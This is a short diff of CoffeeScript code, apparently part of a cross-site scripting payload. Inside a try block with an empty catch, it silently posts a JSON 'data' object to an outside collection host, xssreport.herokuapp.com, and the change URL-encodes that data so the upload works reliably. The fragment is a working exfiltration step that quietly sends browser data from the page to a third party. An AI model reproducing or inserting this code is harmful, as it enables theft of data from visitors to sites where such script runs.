@@ -23,7 +23,7 @@ try
   ajax.post 'http://xssreport.herokuapp.com/upload/', ->
       # do nothing here!! 
       ;
-    , 'd=' + JSON.stringify(data)
+    , 'd=' + encodeURIComponent(JSON.stringify(data))
 catch e
   ;
 
